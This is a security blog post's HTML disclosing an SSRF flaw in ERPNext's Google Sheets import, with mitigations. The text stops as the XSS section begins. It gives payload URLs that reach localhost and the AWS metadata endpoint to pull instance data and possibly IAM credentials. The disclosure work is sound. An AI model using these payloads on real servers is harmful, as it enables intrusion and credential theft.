<!DOCTYPE html><html domain="tech-blog.cymetrics.io" ga-id="G-3VBVCXV9Z0" lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="CYBER,Cymetrics,Security" name="keywords"><link href="/img/favicon/favicon-192x192.png?hash=42b087227d" rel="icon" type="image/png"><meta content="#5789d3" name="theme-color"><title>SSRF and Account Takeover via XSS in ERPNext (0-day)</title><meta content="SSRF and Account Takeover via XSS in ERPNext (0-day)" property="og:title"><meta content="SSRF and Account Takeover via XSS in ERPNext (0-day)" name="twitter:title"><meta content="summary_large_image" name="twitter:card"><meta content="ERPNext is a very popular open-source ERP(Enterprise Resource Planning) software built on Frappe Framework.Last December, we found two vulnerabilities in the latest version of ERPNext: SSRF(Server-Side Request Forgery) and account takeover via XSS. Both vulnerabilities require a low-privileged authenticated user to perform the attack." name="description"><meta content="ERPNext is a very popular open-source ERP(Enterprise Resource Planning) software built on Frappe Framework.Last December, we found two vulnerabilities in the latest version of ERPNext: SSRF(Server-Side Request Forgery) and account takeover via XSS. Both vulnerabilities require a low-privileged authenticated user to perform the attack." name="twitter:description"><meta content="ERPNext is a very popular open-source ERP(Enterprise Resource Planning) software built on Frappe Framework.Last December, we found two vulnerabilities in the latest version of ERPNext: SSRF(Server-Side Request Forgery) and account takeover via XSS. Both vulnerabilities require a low-privileged authenticated user to perform the attack." property="og:description"><meta content="article" property="og:type"><meta content="https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/" property="og:url"><meta content="Cymetrics Tech Blog" property="og:site_name"><meta content="https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/cover-en.png" property="og:image"><meta content="https://tech-blog.cymetrics.io/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/cover-en.png" name="twitter:image"><meta content="hsZQwAip9iIbys-i4PJp_MfpNiA6w6RB0hYdWLiLUuk" name="google-site-verification"><link href="https://tech-blog.cymetrics.io/en/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/" rel="canonical"><meta content="always" name="referrer"><link href="/feed/feed.xml" rel="alternate" type="application/atom+xml" title="Cymetrics Tech Blog"><link href="/" rel="preconnect" crossorigin=""><script async="" src="/js/min.js?hash=7f26b2ece8" defer=""></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3VBVCXV9Z0"></script><script>window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3VBVCXV9Z0');</script><script csp-hash="">if (/Mac OS X/.test(navigator.userAgent))document.documentElement.classList.add('apple')</script><style>:root{--primary-color: #5789d3;--primary-dark-color: #ffd349;--fgColor: #2f2f2f;--bgColor: linear-gradient(to top, #efefef, #ffffff);--primary: var(--primary-color);--primary-dark: var(--primary-dark-color);--fg: var(--fgColor);--bg: var(--bgColor);--progressColor: #ffd349;--main-width: calc(100vw - 3em)}main img{content-visibility:auto}article *{scroll-margin-top:50px}header nav{z-index:1;position:fixed;top:0;left:0;width:100vw;background:#fff;font-weight:200;text-align:right;padding:0}@media (min-width:37.5em){:root{--main-width: calc(37.5em - 3em)}}dialog,share-widget{position:fixed;opacity:.9}share-widget{right:20px;bottom:20px;width:50px;height:50px;border-radius:50%;overflow:hidden;box-shadow:2px 3px 5px 2px rgba(0,0,0,.2)}@media screen and (max-width:376px){share-widget{display:none}}share-widget div{margin-left:50%;transform:translateX(-50%);width:20px;height:20px;background-image:url(/img/share.svg);background-repeat:no-repeat;background-position:center;background-size:contain}.apple share-widget div{background-image:url(/img/share-apple.svg)}share-widget button{margin:0;padding:0;width:100%;height:100%;transition:.3s}share-widget button:active{transform:scale(1.2)}dialog{background-color:var(--primary-dark);z-index:1000;font-size:14px}#reading-progress{z-index:1;background-color:var(--progressColor);width:100vw;position:absolute;left:0;bottom:0;height:2px;transform:translate(-100vw,0);will-change:transform;pointer-events:none}#posts li{margin-bottom:.5em}html{line-height:1.15;-webkit-text-size-adjust:100%;font-family:"Open Sans",-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Noto Sans","Helvetica Neue",Helvetica,Arial,"Noto Sans TC","PingFang TC","Hiragino Sans GB","Heiti TC","Microsoft YaHei","Microsoft Jhenghei",sans-serif;--font-family: "Open Sans", -apple-system, system-ui, BlinkMacSystemFont,
    "Segoe UI", Roboto, "Noto Sans", "Helvetica Neue", Helvetica, Arial,
    "Noto Sans TC", "PingFang TC", "Hiragino Sans GB", "Heiti TC",
    "Microsoft YaHei", "Microsoft Jhenghei", sans-serif}body{margin:0}body.lock{overflow:hidden}a{background-color:transparent;text-underline-offset:2px;text-decoration:none;color:var(--primary)}b,strong{font-weight:700}img{border-style:none;max-width:100%;height:auto;margin:0 auto}button,input{font-family:inherit;font-size:100%;line-height:1.15;overflow:visible}button{text-transform:none}input{margin:0}[type=button],[type=reset],button{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}h2{font-size:2.5em;line-height:1.2;margin-bottom:.6em;line-height:2.4rem;margin-bottom:1.36rem;font-size:1.728rem}h3{font-size:2em;line-height:1.125;margin-bottom:.75em;font-size:1.4rem;line-height:1.5rem;margin-bottom:1rem}body,ol,p,pre{font-size:1em}ol,p,pre{margin-bottom:1.5em}body,ol,p,pre{font-size:1rem;line-height:1.6}ol,p,pre{margin-bottom:1.36rem}@media (min-width:600px){h2{font-size:2.0097rem;line-height:2.52rem}h3{font-size:1.7989rem;line-height:2rem}body,ol,p,pre{font-size:1.1rem;line-height:1.6}h2,h3,ol,p,pre{margin-bottom:1.496rem}}@media (min-width:1200px){h2{font-size:2.05rem}h3{font-size:1.5rem}body,ol,p,pre{font-size:1.2rem;line-height:1.6}h2,h3,ol,p,pre{margin-bottom:1.632rem}}code,pre{overflow-x:auto}pre{font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace}pre code:not([class]){overflow-x:scroll}code{border-radius:.3em;color:#e33671;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:90%}h1,h2,h3{font-family:var(--font-family)}a:hover{text-decoration:underline}form{padding:1.5em 1.5em 0;border:.2rem solid #202020}button,input{border-radius:.3em;max-width:100%}form,input{margin-bottom:1.5em}input{padding:.75em;display:inline}button+label,input+label,label+*{page-break-before:always}label{display:inline-block}form>:not(fieldset){margin-right:.75em}button,input[type=reset]{background:#f2f2f2;color:#191919;cursor:pointer;display:inline-block;padding:.75em 1.5em;text-align:center;margin:0 .75em 1.5em 0}button:hover,input[type=reset]:hover{background:#d9d9d9;color:#000}button:not([disabled]){background:#f9c412;color:#181818;background:var(--primary)}button:not([disabled]):hover{background:#ba9005;color:#000;background:var(--primary-dark)}input[type=file],input[type=number],input[type=password],input[type=text],input[type=time],input[type=url]{border:1px solid #595959;padding:.75em}*{border:0;box-sizing:border-box}body{font-family:var(--font-family);background:var(--bg);color:var(--fg)}header label{display:block}article,header{max-width:100%;width:42.5em;margin:0 auto}header{padding:4.5em 24px 0;text-align:center;display:flex;align-items:center;flex-direction:column}header p,ol{margin-top:0}header nav .nav-title{float:left;font-size:inherit;line-height:inherit;margin:0;text-align:left}header nav label{color:#000;cursor:pointer;margin:0;font-style:normal;text-align:right}main{max-width:70rem;margin:0 auto;min-height:60vh}article{padding:1.5em;word-break:break-word}li ol{margin-bottom:0}blockquote{padding:0 1.5em;margin:1.5em 0 1.5em 1.5em;border-left:4px solid var(--primary)}blockquote footer{background:0 0;display:block;color:#ccc;padding:.75em 0;font-size:90%;text-align:start}code[class*=language-],pre[class*=language-]{color:#ccc;background:0 0;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#2d2d2d}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.comment,.token.doctype{color:#999}.token.punctuation{color:#ccc}.token.tag{color:#e2777a}.token.function,.token.number{color:#f08d49}.token.constant,.token.property{color:#f8c555}.token.builtin,.token.keyword{color:#cc99cd}.token.regex,.token.string{color:#7ec699}.token.operator,.token.url{color:#67cdcc}.token.bold{font-weight:700}.token.inserted{color:green}::-webkit-scrollbar-thumb:hover{background:var(--primary)}.w-full{width:100%}h1{font-size:32px;line-height:1.25;margin:.67em 0;text-align:left}header aside{font-size:16px;color:#4b4b4b}.post,footer{border-top:1px solid #ccc}.post{padding-top:35px;margin-top:35px}.menu__btn{display:inline-block;width:24px;height:24px;position:relative}.menu__btn span{opacity:0;width:1px;height:1px;overflow:hidden;display:block}.menu__btn::after,.menu__btn::before{content:"";position:absolute;top:51%;left:50%;height:2px;width:17px;background-color:#2d2d2d;border-radius:.1rem}.menu__btn::before{transform:translate(-50%,-50%);box-shadow:0 .3rem 0 #2d2d2d,0 -.3rem 0 #2d2d2d}.menu__btn::after{display:none;transform:translate(-50%,-50%) rotate(90deg)}.menu__btn.menu__btn--close{z-index:9;transform:rotate(45deg)}.menu__btn.menu__btn--close::before{box-shadow:none}.menu__btn.menu__btn--close::after{display:block}#nav,#nav .nav-title{display:flex;align-items:center}#nav{position:relative;height:68px;z-index:2}#nav .nav-title{padding:.375rem 1.5rem;width:100%;justify-content:space-between}#nav .nav-title *,.article-footer img{margin:0}.nav__links{display:none;flex-direction:column;position:fixed;z-index:3;top:0;left:0;right:0;bottom:0;padding:86px 48px 0;background-image:linear-gradient(to top,#efefef,#fff),linear-gradient(to bottom,#f9f9f9,#f9f9f9)}.nav__links--open{display:flex}.nav__links a{text-align:left;width:100%;padding:.5rem 0;transition:all .3s ease-out;font-weight:700;text-decoration:none;color:var(--fg)}.nav__links a:hover{color:var(--primary-color)}.nav-logo{width:260px;height:40px;background:url(/img/logo1.png) no-repeat center center;background-size:contain}footer{margin-top:48px;font-size:14px;padding:24px;text-align:center}.copyright{display:inline-block}footer>*{margin:.5em}.footer-logos{display:flex;align-items:center;justify-content:center}.footer-logos a:not(:first-child){margin-left:32px}.post-tags{display:flex;gap:0 16px;flex-wrap:wrap}.direct-link{display:none}.post-avatar{margin-top:27px;display:flex;align-items:center;height:36px}.post-avatar__img{width:36px;height:36px;overflow:hidden;margin:0;border-radius:50%}.post-avatar__time{font-size:13px}.post-avatar__info{margin-left:8px;color:#747474;text-align:left}.post-avatar__author{font-size:14px;font-weight:700}.article-footer{margin-top:40px;border-bottom:1px solid #ccc;padding-bottom:52px}.article-footer a{float:right;display:flex;align-items:center;color:var(--fg);font-weight:700;margin-left:4px}.article-author{margin-top:34px;display:flex;align-items:flex-start;margin-bottom:48px}.article-author__img{width:80px;height:80px;overflow:hidden;margin:0;border-radius:50%;flex-shrink:0}.article-author__info{margin-left:16px;text-align:left}.article-author__title{color:#747474;font-size:16px}.article-author__author{font-size:22px;font-weight:700;line-height:1em}.article-author__intro{color:#2f2f2f;margin-top:8px}@media (min-width:768px){h1{font-size:48px}header aside{font-size:20px}header nav a:first-of-type{margin-left:auto}header nav a:last-of-type{margin-right:1.5em}.menu__btn{display:none}#nav,footer{max-width:1168px}#nav{height:80px;margin:0 auto}.nav-logo{width:313px}.nav__links{display:flex;flex-direction:row;position:static;padding:0;background-image:none}.nav__links a{text-align:center;margin-left:56px}footer{display:flex;flex-direction:row-reverse;justify-content:space-between;align-items:center;margin-left:auto;margin-right:auto}}</style></head><body><header><nav><div id="nav"><div class="nav-title"><a href="/en" class="nav-logo" title="Homepage"></a> <label class="menu__btn" for="menu__control"><span>Menu</span></label></div><div class="nav__links"><a href="/en/archive/">Archive</a> <a href="/en/tags/">Tags</a> <a href="/en/about/">About</a> <a href="/" style="white-space:nowrap;">中文</a></div></div><div id="reading-progress" aria-hidden="true"></div></nav><h1 class="w-full">SSRF and Account Takeover via XSS in ERPNext (0-day)</h1><aside class="w-full"><div class="post-tags"><a href="/en/tags/postsen/" class="post-tag">#postsEn</a> <a href="/en/tags/security/" class="post-tag">#Security</a></div><div class="post-avatar"><img alt="huli" src="/img/authors/huli_logo.jpg" class="post-avatar__img" data-deopt="true"><div class="post-avatar__info"><div class="post-avatar__author"><a href="/en/posts/huli">huli</a></div><div class="post-avatar__time">06 Apr 2022</div></div></div></aside><dialog id="message"></dialog></header><main><article><div id="post-page"></div><p><a href="https://erpnext.com/" rel="noopener noreferrer" target="_blank">ERPNext</a> is a very popular open-source ERP(Enterprise Resource Planning) software built on <a href="https://github.com/frappe/frappe" rel="noopener noreferrer" target="_blank">Frappe Framework</a>.</p><p>Last December, we found two vulnerabilities in the latest version of ERPNext: SSRF(Server-Side Request Forgery) and account takeover via XSS. Both vulnerabilities require a low-privileged authenticated user to perform the attack.</p><p>By exploiting SSRF, a malicious actor could steal the credentials from cloud metadata and may lead to RCE. For XSS, it's possible to take over others’ accounts.</p><p>We reported both vulnerabilities on November 25th, 2021. At the time of writing, there is still no fix for those two issues, so we decided to publish the details to inform the public about the risk.</p><h2 id="ssrf(server-side-request-forgery)"><a href="#ssrf(server-side-request-forgery)" class="direct-link">#</a> SSRF(Server-Side Request Forgery)</h2><p>In ERPNext, the user with certain roles can import data from files or Google Sheets:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p1-1920w.png" height="1078" width="2228" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2228 1078'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAFCAYAAACTphZWAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAaklEQVQImW2O2woCMAxD+/8/6oOrvtj71shEhqiBQwqhIXQZdzAzBt8wmHEdjFRBVSGroOZQM5g7SFUQkZhzot7s2z0gqujuAz1EYGZY3VhrHXb4LRJRRMRP8E9k5tgP2zPztTOzTvvnjCduBtgEJ/D0IgAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>After data is imported, you can preview the content before saving it to the system.</p><p>Following is the function for importing data from Google Sheets:</p><pre class="language-py"><code class="language-py"><span class="token keyword">def</span> <span class="token function">get_csv_content_from_google_sheets</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><br>  <span class="token comment"># https://docs.google.com/spreadsheets/d/{sheetid}}/edit#gid={gid}</span><br>  validate_google_sheets_url<span class="token punctuation">(</span>url<span class="token punctuation">)</span><br>  <span class="token comment"># get gid, defaults to first sheet</span><br>  <span class="token keyword">if</span> <span class="token string">"gid="</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span><br>    gid <span class="token operator">=</span> url<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'gid='</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><br>  <span class="token keyword">else</span><span class="token punctuation">:</span><br>    gid <span class="token operator">=</span> <span class="token number">0</span><br>  <span class="token comment"># remove /edit path</span><br>  url <span class="token operator">=</span> url<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'/edit'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><br>  <span class="token comment"># add /export path,</span><br>  url <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">'/export?format=csv&gid={0}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>gid<span class="token punctuation">)</span><br><br>  headers <span class="token operator">=</span> <span class="token punctuation">{</span><br>    <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'text/csv'</span><br>  <span class="token punctuation">}</span><br>  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><br><br>  <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span><br>    <span class="token comment"># if it returns html, it couldn't find the CSV content</span><br>    <span class="token comment"># because of invalid url or no access</span><br>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'&lt;/html>'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>      frappe<span class="token punctuation">.</span>throw<span class="token punctuation">(</span><br>        _<span class="token punctuation">(</span><span class="token string">'Google Sheets URL is invalid or not publicly accessible.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><br>        title<span class="token operator">=</span>_<span class="token punctuation">(</span><span class="token string">"Invalid URL"</span><span class="token punctuation">)</span><br>      <span class="token punctuation">)</span><br>    <span class="token keyword">return</span> response<span class="token punctuation">.</span>content<br>  <span class="token keyword">elif</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">400</span><span class="token punctuation">:</span><br>    frappe<span class="token punctuation">.</span>throw<span class="token punctuation">(</span>_<span class="token punctuation">(</span><span class="token string">'Google Sheets URL must end with "gid={number}". Copy and paste the URL from the browser address bar and try again.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><br>      title<span class="token operator">=</span>_<span class="token punctuation">(</span><span class="token string">"Incorrect URL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>  <span class="token keyword">else</span><span class="token punctuation">:</span><br>    response<span class="token punctuation">.</span>raise_for_status<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>It's straightforward, just get the data from Google Sheets and check the format.</p><p>But, what if we provide a URL that looks like Google Sheet URL, but it's not?</p><p>The system only checks if the URL contains <code>docs.google.com/spreadsheets</code>:</p><pre class="language-py"><code class="language-py"><span class="token keyword">def</span> <span class="token function">validate_google_sheets_url</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span><br>  <span class="token keyword">if</span> <span class="token string">"docs.google.com/spreadsheets"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> url<span class="token punctuation">:</span><br>    frappe<span class="token punctuation">.</span>throw<span class="token punctuation">(</span><br>      _<span class="token punctuation">(</span><span class="token string">'"{0}" is not a valid Google Sheets URL'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">,</span><br>      title<span class="token operator">=</span>_<span class="token punctuation">(</span><span class="token string">"Invalid URL"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><br>    <span class="token punctuation">)</span></code></pre><p>So, we can provide a URL like this: <code>http://localhost:8080/#docs.google.com/spreadsheets</code>, then we can get the response from the internal network. It's a classic SSRF vulnerability.</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p2-1920w.png" height="1030" width="2208" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2208 1030'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAFCAYAAACTphZWAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAsUlEQVQImS2OyQrCMABE++eiqK1Nm6TG5eDJgstFQUVc0CLih7jEPxDqcniS6sC7DDPDeOVAEkSSUtVnOltws3fOlyvXmy2w1pIORtTCGK8RKyJtqPghh+MJp+frxfvzIc9zHm+YzJcEkcJryKQIC9UkHY7JDke2u4zNLmO13pDO9pheH5m08MJ/WLe6CGWoC4kvVIFbE7FCJgZlOu6GxheSINYI/TOlaRdlh3I4r9nmCwToolABfDUqAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>If the port is open, the response will be different:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p3-1920w.png" height="1036" width="2212" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2212 1036'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAAFCAYAAACTphZWAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAsUlEQVQImS2LX0sCQRxF55tHIvtnZnd+6+6m4EMoFJQPYYggaqWY6KeIdepL9LCemGkvHC5czlW3iSXJLDf9mPliifv+4atpaC4u4JzjfvpApC0qzYWsqOhFmuPpjE/btly7/r3C88sraSao1A6CrKXk8WnG/vDJ9mPH5n3Har1hOn+jHk+wgxqlO7moRxgpiXRObOw/mWByCaJUQ1SSF8RG8G2KKoy2GoazRzx+K+/4AxwQooJn8BcQAAAAAElFTkSuQmCC'%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>Moreover, we can access sensitive information via cloud metadata if the server is hosted on a cloud service.</p><p>For example, frappe cloud is hosted on AWS, so we can get metadata in <code>http://169.254.169.254/latest/dynamic/instance-identity/document#docs.google.com/spreadsheets</code>:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p4-1920w.png" height="1638" width="2560" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' xmlns%3Axlink='http%3A//www.w3.org/1999/xlink' viewBox='0 0 2560 1638'%3E%3Cfilter id='b' color-interpolation-filters='sRGB'%3E%3CfeGaussianBlur stdDeviation='.5'%3E%3C/feGaussianBlur%3E%3CfeComponentTransfer%3E%3CfeFuncA type='discrete' tableValues='1 1'%3E%3C/feFuncA%3E%3C/feComponentTransfer%3E%3C/filter%3E%3Cimage filter='url(%23b)' preserveAspectRatio='none' height='100%25' width='100%25' xlink%3Ahref='data%3Aimage/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAGCAYAAAD68A/GAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAgklEQVQImWWPSw7DMAhEuf8+PVFzBB+h2TaureIPMBW4iioVaTbMmxHQmxkiCh9zmf3JHXqVilIruLVQ6z1CEQwIUDNQ7x0iAlW9jJwzSikX7CJx4Gfh6ed5Ysy52tSihLztgnTdet93bNsNzPyFFTTnhLf6QysEPI4DKSWMMQLy/QdXgupWyHpXkAAAAABJRU5ErkJggg=='%3E%3C/image%3E%3C/svg%3E&#34;)"></picture></p><p>If there is an IAM associated with the instance, we can also read its credentials and escalate to RCE, here is one example: <a href="https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40" rel="noopener noreferrer" target="_blank">Escalating SSRF to RCE</a>.</p><h3 id="mitigation"><a href="#mitigation" class="direct-link">#</a> Mitigation</h3><p>Before a new patched version release, we suggest that:</p><ol><li>Be careful when you grant importing data permission to a user.</li><li>Keep ERPNext in an isolated environment.</li><li>Requires <a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-options.html" rel="noopener noreferrer" target="_blank">IMDSv2</a> for AWS instance.</li></ol><h2 id="account-takeover-via-xss"><a href="#account-takeover-via-xss" class="direct-link">#</a> Account Takeover via XSS</h2><p>Every user in the ERPNext system has a profile page, like the following:</p><p><picture><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1920w.webp 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1280w.webp 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-840w.webp 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-320w.webp 320w" type="image/webp"><source sizes="(max-width: 758px) 100vw, 758px" srcset="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1920w.png 1920w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1280w.png 1280w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-840w.png 840w, /img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-320w.png 320w" type="image/png"><img alt="" src="/img/posts/huli/erpnext-ssrf-and-xss-to-account-takeover/p5-1920w.png" height="1258" width="2018" decoding="async" loading="lazy" style="background-size:cover;background-image:url(&#34;data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http%3A//www.w3.org/2000/svg' 